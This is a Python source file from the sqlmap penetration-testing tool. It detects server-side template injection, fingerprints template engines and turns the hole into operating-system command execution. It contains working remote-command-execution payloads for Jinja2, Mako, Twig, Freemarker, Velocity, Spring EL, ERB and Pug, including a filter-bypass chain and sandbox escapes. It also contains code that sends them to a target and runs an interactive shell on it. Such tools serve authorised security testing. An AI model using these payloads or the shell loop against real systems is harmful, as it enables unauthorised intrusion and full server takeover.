#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import difflib
import re
import time

from collections import namedtuple

from lib.core.common import beep
from lib.core.common import randomInt
from lib.core.common import randomStr
from lib.core.convert import getUnicode
from lib.core.data import conf
from lib.core.data import logger
from lib.core.enums import CUSTOM_LOGGING
from lib.core.enums import PLACE
from lib.core.settings import SSTI_ERROR_SIGNATURES
from lib.core.settings import UPPER_RATIO_BOUND
from lib.request.connect import Connect as Request


SENTINEL = randomStr(length=10, lowercase=True)

SSTI_PLACES = (PLACE.GET, PLACE.POST, PLACE.COOKIE, PLACE.CUSTOM_POST)

# Each Engine entry defines detection payloads and expected behaviour for one
# template engine.  Arithmetic fields use %d placeholders filled with randomInt()
# at probe time so a static "49" on the page cannot produce a false positive.
# Engines are listed in detection-priority order.
Engine = namedtuple("Engine", (
    "name",             # human-readable engine name
    "family",           # language family (python, php, java, ruby, nodejs)
    "delimiter",        # expression delimiter opening (e.g. "{{")
    "delimiterClose",   # expression delimiter closing (e.g. "}}")
    "errorRegex",       # combined engine-specific error regex (None for "no specific signature")
    "errorProbes",      # tuple of malformed payload suffixes that trigger engine errors
    "arithmeticFmt",    # arithmetic proof with two %d placeholders (e.g. "{{ %d*%d }}"), or ""
    "arithmeticUnescapedFmt",  # same with escape bypass (e.g. "{{ (%d*%d)|safe }}"), or ""
    "booleanTrue",      # boolean true payload
    "booleanFalse",     # boolean false payload
    "trueRendered",     # what true renders as (for response matching)
    "falseRendered",    # what false renders as
    "distinguishingProbe",  # cross-engine disambiguation probe (None if n/a)
    "distinguishingResult", # expected substring from disambiguation probe
    "expressionFmt",        # format string for wrapping expressions (e.g. "{{ %s }}"), or ""
    "rcePayloads",          # tuple of (payload_template, description) with {CMD} for command, or ()
))


def _arithmeticPayload(fmt, a, b):
    # Substitute the two operands into the first two %d tokens by literal replacement rather than
    # %-formatting: some engines' delimiters contain a literal '%' (e.g. ERB '<%= ... %>'), where
    # fmt % (a, b) raises ValueError and would silently disable arithmetic detection for them.
    return fmt.replace("%d", str(a), 1).replace("%d", str(b), 1)


def _degroup(text):
    # Strip digit-group (thousands) separators so an arithmetic result still matches when the
    # engine formats large numbers with grouping (e.g. FreeMarker renders 234*567 as "132,678").
    # Only separators sitting between digits are removed, so ordinary text is untouched.
    return re.sub(u"(?<=\\d)[,\u00a0\u202f\u2009']" + u"(?=\\d)", "", getUnicode(text))


_ENGINE_TABLE = (
    # -- Python -------------------------------------------------------------------------------------------
    Engine("Jinja2", "python",
           "{{", "}}",
           r"(?i)(?:jinja2\.exceptions\.\w+|TemplateSyntaxError|UndefinedError|TemplateNotFound|TemplateAssertionError)",
           ("{{", "{{ }}", "{{ unknown|filter }}"),
           "{{ %d*%d }}", "{{ (%d*%d)|safe }}",
           "{{ True }}", "{{ False }}", "True", "False",
           None, None,  # Jinja2/Twig distinguished by trueRendered ("True"/"False" vs "1"/"")
           "{{ %s }}",
           # Jinja2: try multiple RCE paths in order (cycler -> config -> lipsum -> attr()-chain).
           # The last one is dot-/underscore-free (filters + \x5f-escaped dunders), bypassing
           # sanitisers that block '.'/'_' (the CVE-2025-23211 Tandoor technique).
           (("{{ cycler.__init__.__globals__.os.popen('{CMD}').read() }}", "cycler.__globals__"),
            ("{{ config.from_envvar.__globals__.__builtins__.__import__('os').popen('{CMD}').read() }}", "config.from_envvar chain"),
            ("{{ lipsum.__globals__.os.popen('{CMD}').read() }}", "lipsum.__globals__"),
            ("{{ cycler|attr('\\x5f\\x5finit\\x5f\\x5f')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('os')|attr('popen')('{CMD}')|attr('read')() }}", "attr() filter chain (dot/underscore-free)"))),
    Engine("Mako", "python",
           "${", "}",
           r"(?i)(?:mako\.exceptions\.\w+|mako\.runtime|CompileException|SyntaxException)",
           ("${", "${}", "<%", "<%!"),
           "${%d*%d}", "",
           "${True}", "${False}", "True", "False",
           None, None,  # capital True/False uniquely identifies Mako within the ${ } family (Freemarker/Spring render lowercase true/false)
           "${%s}",
           # Mako: popen captures output; self.module.runtime path needs no <%import%> preamble
           (("${self.module.runtime.util.os.popen('{CMD}').read()}", "self.module.runtime.util.os.popen"),
            ("<%import os%>${os.popen('{CMD}').read()}", "import os + popen"))),
    # -- PHP ----------------------------------------------------------------------------------------------
    Engine("Twig", "php",
           "{{", "}}",
           r"(?i)(?:Twig[\\_]Error|Twig[\\_]Environment|syntax error, unexpected|Unknown (?:filter|function|test|tag))",
           ("{{", "{{ }}", "{{ unknown|filter }}"),
           "{{ %d*%d }}", "{{ (%d*%d)|raw }}",
           "{{ true }}", "{{ false }}", "1", "",
           # '_self' renders 'Twig_Template' (Twig 1) or '__string_template__...' (Twig 2/3);
           # 'emplate' is the substring common to both, so the probe is version-stable
           "{{ _self }}", "emplate",
           "{{ %s }}",
           # Twig: filter() chain first; then sort()/map() callbacks, which double as classic
           # sandbox escapes when 'filter' is not on the policy allow-list (DEEP1 Phishtale)
           (("{{ ['{CMD}']|filter('system') }}", "filter('system')"),
            ("{{ ['{CMD}']|filter('exec') }}", "filter('exec')"),
            ("{{ ['{CMD}']|filter('shell_exec') }}", "filter('shell_exec')"),
            ("{{ ['{CMD}', '']|sort('system')|join }}", "sort('system') sandbox escape"),
            ("{{ ['{CMD}']|map('system')|join }}", "map('system') sandbox escape"))),
    # -- Java ---------------------------------------------------------------------------------------------
    Engine("Freemarker", "java",
           "${", "}",
           r"(?i)(?:freemarker\.(?:core|template|extract|cache)\.\w+|ParseException|InvalidReferenceException|TemplateException)",
           ("${", "${}", "<#if ", "<#--"),
           "${%d*%d}", "${(%d*%d)?no_esc}",
           # modern FreeMarker errors on a bare ${true} ("boolean_format"); ?c gives the
           # computer-format "true"/"false" string, so the boolean oracle works on real FreeMarker
           "${true?c}", "${false?c}", "true", "false",
           # Freemarker '?builtin' syntax (SpEL/Thymeleaf can't parse '?upper_case' -> errors there),
           # giving an intrinsic, non-empty discriminator from Spring within the shared '${ }' family
           '${"sstimark"?upper_case}', "SSTIMARK",
           "${%s}",
           # Freemarker: classic -> indirect-assign fallback
           (("${'freemarker.template.utility.Execute'?new()('{CMD}')}", "Execute?new"),
            ("<#assign ex='freemarker.template.utility.Execute'?new()>${ex('{CMD}')}", "assign+new"))),
    Engine("Velocity", "java",
           "$", "",
           r"(?i)(?:org\.apache\.velocity\.(?:runtime|exception)\.\w+|ParseErrorException|MethodInvocationException|ResourceNotFoundException)",
           ("$", "#if(", "#set($x=)"),
           "", "",
           "#if(true) TRUE #end", "#if(false) TRUE #else FALSE #end", "TRUE", "FALSE",
           "#* velocity *#", "",
           "",  # no generic expression wrapper
           # Velocity (pre-2.3; patched by CVE-2020-13936). Primary: portable String.class.forName()
           # reflection chain - needs NO velocity-tools $class in the context - reading the process
           # stdout byte-by-byte so the command output is rendered in-band. Fallback: the velocity-tools
           # ClassTool ($class) form, for apps that expose it.
           (("#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))"
             "#set($chr=$x.class.forName('java.lang.Character'))"
             "#set($str=$x.class.forName('java.lang.String'))"
             "#set($ex=$rt.getRuntime().exec('{CMD}'))#set($w=$ex.waitFor())"
             "#set($out=$ex.getInputStream())"
             "#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end", "String.class.forName chain"),
            ("#set($str=$class.inspect('java.lang.String').type)"
             "#set($chr=$class.inspect('java.lang.Character').type)"
             "#set($ex=$class.inspect('java.lang.Runtime').type.getRuntime().exec('{CMD}'))#set($w=$ex.waitFor())"
             "#set($out=$ex.getInputStream())"
             "#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end", "ClassTool chain"))),
    Engine("Spring EL / Thymeleaf", "java",
           "${", "}",
           r"(?i)(?:org\.springframework\.expression\.\w+|org\.thymeleaf\.\w+|SpelEvaluationException|TemplateProcessingException|ExpressionParsingException|ValidationFailedException)",
           ("${", "${}", "#{", "*{"),
           "${%d*%d}", "",
           "${true}", "${false}", "true", "false",
           # SpEL Java method call (Freemarker uses '?upper_case', not '.toUpperCase()' -> errors
           # there), giving an intrinsic, non-empty discriminator from Freemarker in '${ }'
           "${'sstimark'.toUpperCase()}", "SSTIMARK",
           "${%s}",
           # SpEL: read the process stdout (so output is captured, not just a Process object);
           # then a blind exec; then the OGNL form for engines that parse OGNL instead of SpEL
           (("${new java.io.BufferedReader(new java.io.InputStreamReader(T(java.lang.Runtime).getRuntime().exec('{CMD}').getInputStream())).readLine()}", "SpEL readLine (output)"),
            ("${T(java.lang.Runtime).getRuntime().exec('{CMD}')}", "T(Runtime).exec (blind)"),
            ("${(#rt=@java.lang.Runtime@getRuntime()).exec('{CMD}')}", "OGNL @Runtime@getRuntime (blind)"))),
    # -- Ruby ---------------------------------------------------------------------------------------------
    Engine("ERB", "ruby",
           "<%=", "%>",
           r"(?i)(?:erb|SyntaxError|undefined local variable|no implicit conversion|wrong number of arguments|\(erb\):\d+)",
           ("<%=", "<%", "<%#", "<%= foo.unknown_method %>"),
           "<%= %d*%d %>", "<%= raw %d*%d %>",
           "<%= true %>", "<%= false %>", "true", "false",
           "<%= defined? Rails %>", "",
           "<%= %s %>",
           # ERB: backtick captures output; system() returns only exit status
           (("<%= `{CMD}` %>", "backtick"),)),
    # -- Node.js ------------------------------------------------------------------------------------------
    Engine("Pug/Jade", "nodejs",
           "#{", "}",
           r"(?i)(?:pug|jade|Cannot read propert|is not a function|TypeError|ReferenceError)",
           ("#{", "!{", "#{ }"),
           "#{%d*%d}", "!{%d*%d}",
           "#{true}", "#{false}", "true", "false",
           None, None,
           "#{%s}",
           (("#{global.process.mainModule.require('child_process').execSync('{CMD}')}", "execSync"),)),
    Engine("Handlebars", "nodejs",
           "{{", "}}",
           r"(?i)(?:handlebars|Handlebars|Parse error on line|\{\{[\w.]+\}\})",
           ("{{", "{{#if}}", "{{/each}}"),
           "", "",
           "{{#if true}}yes{{/if}}", "{{#if false}}yes{{/if}}", "yes", "",
           None, None,
           "",  # no generic expression wrapper without registered helpers
           ()),  # RCE requires pre-registered helpers; not generically exploitable
)


def _ratio(first, second):
    return difflib.SequenceMatcher(None, first or "", second or "").quick_ratio()


def _delim(place):
    return (conf.cookieDel or ';') if place == PLACE.COOKIE else '&'


def _confParameters(place):
    try:
        return conf.parameters.get(place, "")
    except AttributeError:
        return conf.parameters[place] if place in conf.parameters else ""


def _originalValue(place, parameter):
    for segment in _confParameters(place).split(_delim(place)):
        name, _, value = segment.partition('=')
        if name.strip() == parameter:
            return value
    return conf.paramDict.get(place, {}).get(parameter) or ""


def _replaceSegment(place, parameter, value):
    delimiter = _delim(place)
    raw = _confParameters(place)
    retVal, replaced = [], False

    for part in raw.split(delimiter):
        name, _, _ = part.partition('=')
        if not replaced and name.strip() == parameter:
            retVal.append("%s=%s" % (name, value))
            replaced = True
        else:
            retVal.append(part)

    if not replaced:
        retVal = []
        for name, oldValue in conf.paramDict.get(place, {}).items():
            retVal.append("%s=%s" % (name, value if name == parameter else oldValue))

    return delimiter.join(retVal)


def _send(place, parameter, value):
    """Issue a single HTTP request with the target parameter set to `value`.
    Temporarily mutates conf.parameters so sqlmap's normal request machinery
    (URL construction, cookies, headers, encodings) is fully preserved."""

    if conf.delay:
        time.sleep(conf.delay)

    old_params = conf.parameters.get(place, "")
    conf.parameters[place] = _replaceSegment(place, parameter, value)

    try:
        kwargs = {"raise404": False, "silent": True}
        if conf.verbose >= 3:
            logger.log(CUSTOM_LOGGING.PAYLOAD, "%s=%s" % (parameter, value))
        page, _, _ = Request.getPage(**kwargs)
        return page or ""
    except Exception as ex:
        logger.debug("SSTI probe request failed: %s" % getUnicode(ex))
        return ""
    finally:
        conf.parameters[place] = old_params


def _isError(page, engine):
    if not engine.errorRegex:
        return False
    return bool(re.search(engine.errorRegex, getUnicode(page or "")))


def _backendFromError(page):
    page = getUnicode(page or "")
    for name, regex in SSTI_ERROR_SIGNATURES:
        if re.search(regex, page):
            return name
    return None


def _boolean(truthy, falsy):
    """Return the reproducible true page when true/false probes diverge.
    Both true AND false pages must be independently reproducible."""

    truePage = truthy()
    if truePage is None:
        return None

    truePage2 = truthy()
    if _ratio(truePage, truePage2) < UPPER_RATIO_BOUND:
        return None

    falsePage = falsy()
    if falsePage is None:
        return None

    falsePage2 = falsy()
    if _ratio(falsePage, falsePage2) < UPPER_RATIO_BOUND:
        return None

    if _ratio(truePage, falsePage) < UPPER_RATIO_BOUND:
        return truePage

    return None


def _probeArithmetic(place, parameter, engine):
    """Inject a random arithmetic expression and its control pair (different
    operands, different result).  Both results must appear for their respective
    payloads and NOT bleed across, proving the template is executing the expression
    rather than a static '49' appearing on the page by coincidence."""

    if not engine.arithmeticFmt:
        return False

    original = _originalValue(place, parameter) or ""
    a, b = randomInt(3), randomInt(3)
    c = b + 1  # different operand -> different result

    result1 = str(a * b)
    result2 = str(a * c)

    for fmt in (engine.arithmeticFmt, engine.arithmeticUnescapedFmt):
        if not fmt:
            continue

        try:
            p1 = original + _arithmeticPayload(fmt, a, b)
            p2 = original + _arithmeticPayload(fmt, a, c)
        except (ValueError, TypeError):
            logger.debug("SSTI arithmetic: format failed for engine '%s' with fmt=%r" % (engine.name, fmt))
            continue

        page1 = _send(place, parameter, p1)
        page2 = _send(place, parameter, p2)

        if not page1 or not page2:
            continue

        text1 = getUnicode(page1)
        text2 = getUnicode(page2)

        # Raw payload reflection means the template did NOT execute
        if p1 in text1 or p2 in text2:
            continue

        # Match against a digit-group-stripped copy so a grouped result (e.g. FreeMarker's
        # "132,678") still counts; the raw-reflection check above stays on the original text.
        norm1, norm2 = _degroup(text1), _degroup(text2)

        # Each result must appear in its own response and NOT in the other
        if result1 in norm1 and result2 not in norm1 and result2 in norm2 and result1 not in norm2:
            return True

    return False


def _probeError(place, parameter, engine):
    """Inject each error probe suffix and check for engine-specific error messages."""
    if not engine.errorRegex or not engine.errorProbes:
        return None

    original = _originalValue(place, parameter) or ""

    for probe in engine.errorProbes:
        payload = original + probe
        page = _send(place, parameter, payload)
        if not page:
            continue
        if _isError(page, engine):
            return page
    return None


# A divide-by-zero error is language-family specific, which separates engines that SHARE a
# delimiter but run on different runtimes (Jinja2/Python vs Twig/PHP in '{{ }}', or Mako/Python
# vs Freemarker/Spring/Java in '${ }'). Matching is case-SENSITIVE so Python's lowercase
# 'division by zero' is not confused with PHP's capitalised 'Division by zero'. JS is omitted on
# purpose: 1/0 yields Infinity there rather than an error, so it carries no family signal.
_FAMILY_DIVZERO = (
    ("python", re.compile(r"division by zero")),
    ("ruby",   re.compile(r"divided by 0")),
    ("php",    re.compile(r"DivisionByZeroError|Division by zero")),
    ("java",   re.compile(r"ArithmeticException|/ by zero")),
)


def _probeFamily(place, parameter, engine, cache):
    """Inject a divide-by-zero inside the engine's delimiter and infer the backend language
    family from the resulting error. Returns the family string or None. Responses are cached by
    payload so engines that share a delimiter ('{{1/0}}' etc.) cost a single request."""

    if not engine.arithmeticFmt or not engine.delimiterClose:
        return None

    payload = (_originalValue(place, parameter) or "") + engine.delimiter + "1/0" + engine.delimiterClose
    if payload not in cache:
        cache[payload] = _send(place, parameter, payload)
    page = cache[payload]
    if not page:
        return None

    text = getUnicode(page)
    if payload in text:                      # raw reflection -> template did not execute it
        return None
    for family, regex in _FAMILY_DIVZERO:
        if regex.search(text):
            return family
    return None


def _probeDistinguishing(place, parameter, engine):
    """Send the engine-specific fingerprint probe and verify the response.
    For probes with a non-empty expected result, the result must appear and the
    raw probe must NOT be reflected verbatim.
    For empty-result (comment-style) probes, the response must stay similar to
    baseline and the probe must NOT appear in the output."""

    if not engine.distinguishingProbe:
        return False

    original = _originalValue(place, parameter) or ""
    probe = engine.distinguishingProbe
    page = _send(place, parameter, original + probe)
    if page is None:
        return False

    text = getUnicode(page)

    # Reject raw reflection: if the probe appears verbatim, the template didn't execute it
    if probe in text:
        return False

    if engine.distinguishingResult:
        return engine.distinguishingResult in text

    # Empty-result (comment-style) probe: response must stay similar to baseline
    baseline = _send(place, parameter, original)
    return _ratio(page, baseline) >= UPPER_RATIO_BOUND


def _detectBoolean(place, parameter, engine):
    """Establish a boolean oracle for this engine. Returns the true template or None."""
    original = _originalValue(place, parameter) or ""

    truePayload = original + engine.booleanTrue
    falsePayload = original + engine.booleanFalse

    if engine.trueRendered:
        truePage = _send(place, parameter, truePayload)
        if not truePage:
            return None
        text = getUnicode(truePage)
        if truePayload in text or engine.trueRendered not in text:
            return None

    # Reject reflected false payload
    falsePage = _send(place, parameter, falsePayload)
    if falsePage and falsePayload in getUnicode(falsePage):
        return None

    return _boolean(lambda p=truePayload: _send(place, parameter, p),
                    lambda p=falsePayload: _send(place, parameter, p))


def _booleanUniquelyIdentifies(engine):
    """Returns True when the engine's boolean rendering signature is unique
    among all engines sharing the same delimiter, allowing exact naming."""
    siblings = [e for e in _ENGINE_TABLE if e.delimiter == engine.delimiter]
    signature = (engine.booleanTrue, engine.booleanFalse,
                 engine.trueRendered, engine.falseRendered)
    count = sum((e.booleanTrue, e.booleanFalse,
                 e.trueRendered, e.falseRendered) == signature for e in siblings)
    return count == 1


def _familyUniquelyIdentifies(engine):
    """Returns True when the engine's language family is unique among engines sharing the
    same delimiter, so a divide-by-zero family probe is enough to name it exactly."""
    siblings = [e for e in _ENGINE_TABLE if e.delimiter == engine.delimiter]
    return sum(e.family == engine.family for e in siblings) == 1


def _fingerprint(place, parameter):
    """Identify the template engine and confirm injection. Returns (engine, evidence)
    where evidence is a dict of detection results, or (None, None).

    Scoring: arithmetic(3) + boolean(2) + error(1) + distinguishing(2) + family(1).
    Engines sharing delimiters require error, distinguishing, unique boolean rendering, or a
    uniquely-identifying language family to be named exactly; otherwise they are reported as
    family/probable."""

    bestEngine = None
    bestEvidence = None
    bestScore = 0
    divZeroCache = {}

    for engine in _ENGINE_TABLE:
        evidence = {}
        score = 0

        # Phase 1: Arithmetic in-band proof with control pair (strongest)
        if _probeArithmetic(place, parameter, engine):
            evidence["arithmetic"] = True
            score += 3

        # Phase 2: Boolean oracle
        if _detectBoolean(place, parameter, engine):
            evidence["boolean"] = True
            score += 2

        # Phase 3: Error-based fingerprinting
        errorPage = _probeError(place, parameter, engine)
        if errorPage is not None:
            if _isError(errorPage, engine):
                evidence["error"] = True
                score += 1

        # Phase 4: Distinguishing probe (breaks ties within delimiter families)
        if _probeDistinguishing(place, parameter, engine):
            evidence["distinguishing"] = True
            score += 2

        # Phase 5: language-family confirmation via divide-by-zero error class
        if _probeFamily(place, parameter, engine, divZeroCache) == engine.family:
            evidence["family"] = True
            score += 1

        if score > bestScore:
            bestScore = score
            bestEngine = engine
            bestEvidence = evidence

    if bestEngine and bestScore >= 3:
        # For engines with ambiguous delimiters (shared by multiple engines),
        # name a specific engine when: error fingerprint, distinguishing probe,
        # or boolean rendering is unique within the delimiter family.
        _FAMILY = {
            "{{": "Jinja2/Twig/Handlebars-like",
            "${": "Freemarker/SpringEL/Mako-like",
        }
        if bestEngine.delimiter in _FAMILY:
            if (bestEvidence.get("error") or
                bestEvidence.get("distinguishing") or
                (bestEvidence.get("boolean") and _booleanUniquelyIdentifies(bestEngine)) or
                (bestEvidence.get("family") and _familyUniquelyIdentifies(bestEngine))):
                pass  # specific engine name stands
            else:
                bestEngine = bestEngine._replace(
                    name="%s (probable %s)" % (_FAMILY[bestEngine.delimiter], bestEngine.name))
        return bestEngine, bestEvidence

    # Fallback: generic error detection
    errorBackend = None
    for suffix in ("{{", "${", "<%=", "#{"):
        page = _send(place, parameter, _originalValue(place, parameter) + suffix)
        if page:
            backend = _backendFromError(page)
            if backend:
                errorBackend = backend
                break

    if errorBackend:
        for engine in _ENGINE_TABLE:
            if engine.name.lower() in errorBackend.lower():
                return engine, {"error": True}

    return None, None


def sstiScan():
    global SENTINEL
    SENTINEL = randomStr(length=10, lowercase=True)

    debugMsg = "'--ssti' is self-contained: it detects SSTI and fingerprints "
    debugMsg += "common template engines when possible. SQL enumeration "
    debugMsg += "switches (--banner, --dbs, --tables, --users, --sql-query) are ignored"
    logger.debug(debugMsg)

    if not conf.paramDict:
        logger.error("no request parameters to test (use --data, GET params, or similar)")
        return

    tested = 0
    found = []

    for place in (_ for _ in SSTI_PLACES if _ in conf.paramDict):
        # mirror sqlmap's SQL place level-gating: Cookie parameters are only tested at --level >= 2
        if place == PLACE.COOKIE and conf.level < 2:
            continue
        for parameter in list(conf.paramDict[place].keys()):
            if conf.testParameter and parameter not in conf.testParameter:
                continue

            tested += 1
            logger.info("testing SSTI on %s parameter '%s'" % (place, parameter))

            engine, evidence = _fingerprint(place, parameter)
            if engine:
                found.append((place, parameter, engine, evidence))
                logger.info("%s parameter '%s' is vulnerable to SSTI (back-end: '%s')" % (place, parameter, engine.name))
                if conf.beep:
                    beep()

                if engine.arithmeticFmt:
                    payload = _originalValue(place, parameter) + _arithmeticPayload(engine.arithmeticFmt, 7, 7)
                else:
                    payload = _originalValue(place, parameter) + engine.booleanTrue
                title = "SSTI %s injection" % engine.name
                report = "---\nParameter: %s (%s)\n    Type: SSTI\n    Title: %s\n    Payload: %s=%s\n---" % (parameter, place, title, parameter, payload)
                conf.dumper.singleString(report)

                if evidence.get("arithmetic"):
                    logger.info("in-band arithmetic proof confirmed (control-pair)")
                if evidence.get("boolean"):
                    logger.info("boolean oracle confirmed")

    if not found:
        if tested:
            warnMsg = "no parameter appears to be injectable via SSTI (%d tested)" % tested
        else:
            warnMsg = "no parameters found to test for SSTI"
        logger.warning(warnMsg)
    else:
        engines = set(engine.name for _, _, engine, _ in found)
        if len(engines) == 1:
            logger.info("back-end template engine: '%s'" % engines.pop())
        else:
            logger.info("back-end template engines: %s" % ", ".join(sorted(engines)))

    if found:
        slot = found[0]
        place, parameter, engine, evidence = slot
        from lib.core.common import readInput

        wantsTakeover = any(conf.get(_) for _ in ("osCmd", "osShell"))

        # If the user did not ask for exploitation, confirm (benignly) whether OS command
        # execution is reachable and, if so, advise the relevant switches.
        if not wantsTakeover and _canTakeover(engine, evidence) and _probeRce(place, parameter, engine):
            logger.info("the back-end '%s' allows OS command execution via this injection; "
                        "you are advised to try '--os-shell' (interactive) or "
                        "'--os-cmd=<command>' (single command)" % engine.name)

        # --os-cmd / --os-shell: RCE via SSTI (reuses existing SQL takeover flags)
        if conf.get("osCmd") or conf.get("osShell"):
            if not _canTakeover(engine, evidence):
                logger.error("takeover requires exact engine fingerprint (got '%s') and "
                             "confirmed proof (arithmetic or boolean oracle)" % engine.name)
            else:
                if conf.get("osCmd"):
                    _executeCommand(place, parameter, engine, conf.osCmd)

                # Interactive shell runs even under --batch (mirrors the SQL --os-shell, which
                # reads commands straight from the terminal); EOF / 'exit' / 'quit' leaves it.
                if conf.get("osShell"):
                    logger.info("calling SSTI OS shell. Enter commands or 'exit'/'quit' to leave")
                    while True:
                        cmd = readInput("os-shell> ", checkBatch=False)
                        if not cmd or cmd.strip().lower() in ("exit", "quit"):
                            break
                        _executeCommand(place, parameter, engine, cmd.strip())

    logger.info("SSTI scan complete")


def _escapeSingleQuoted(value):
    """Escape backslashes and single quotes for embedding in a single-quoted string."""
    return value.replace("\\", "\\\\").replace("'", "\\'")


def _canTakeover(engine, evidence):
    """Require exact engine fingerprint (not a family guess) and confirmed
    proof before attempting OS command execution."""
    if not engine.rcePayloads:
        return False
    if "(probable" in engine.name or "-like" in engine.name:
        return False
    if not (evidence.get("arithmetic") or evidence.get("boolean")):
        return False
    return True


def _probeRce(place, parameter, engine):
    """Benign, quiet RCE-capability check: run `echo <marker>` via the engine's RCE payloads and
    return True if the marker is reflected (proving OS command execution is reachable). Used only
    to advise the user; it has no side effect beyond echoing a random token."""

    if not engine.rcePayloads:
        return False

    marker = randomStr(length=12, lowercase=True)
    original = _originalValue(place, parameter) or ""
    for payloadTemplate, _description in engine.rcePayloads:
        payload = payloadTemplate.replace("{CMD}", "echo %s" % marker)
        page = _send(place, parameter, original + payload)
        if page and marker in getUnicode(page):
            return True
    return False


def _executeCommand(place, parameter, engine, cmd):
    """Execute an OS command via the engine's RCE payloads, trying each fallback
    in order until one produces output. Captures output via baseline diff."""

    safeCmd = _escapeSingleQuoted(cmd)
    original = _originalValue(place, parameter) or ""
    baseline = _send(place, parameter, original)

    for payloadTemplate, description in engine.rcePayloads:
        payload = payloadTemplate.replace("{CMD}", safeCmd)
        fullPayload = original + payload
        page = _send(place, parameter, fullPayload)

        if not page:
            continue

        # Skip error pages (payload caused a template exception, not a shell)
        if engine.errorRegex and _isError(page, engine):
            continue

        text = getUnicode(page)
        baseText = getUnicode(baseline or "")
        output = ""

        if baseText and text != baseText:
            sm = difflib.SequenceMatcher(None, baseText, text)
            opcodes = sm.get_opcodes()
            parts = []
            for tag, i1, i2, j1, j2 in opcodes:
                if tag in ("insert", "replace"):
                    parts.append(text[j1:j2])
            if parts:
                output = "".join(parts).strip()

        if not output:
            output = text
            if original and output.startswith(original):
                output = output[len(original):]
            output = output.strip()

        # A template that ECHOED our payload directive instead of executing it (e.g. a patched or
        # sandboxed Velocity reflecting the literal "$ex.waitFor()") is reflection, not command
        # output: reject it so the loop falls through to the honest "no output received" warning
        # instead of presenting a reflected payload fragment as a fake command result.
        if output and output in payload:
            continue

        # Suppress when output is just the baseline with the original value removed
        # (command produced no output; the template rendered empty)
        # Filter out template error messages masquerading as command output
        if output and _ratio(output, baseText) < UPPER_RATIO_BOUND:
            if output != baseText.strip() and not (baseText and baseText.replace(original, "").strip() == output):
                conf.dumper.singleString("\nos-shell (%s) [%s]:\n%s" % (cmd, description, output))
                return

    logger.warning("no output received for OS command '%s' (tried %d payload(s))" % (cmd, len(engine.rcePayloads)))
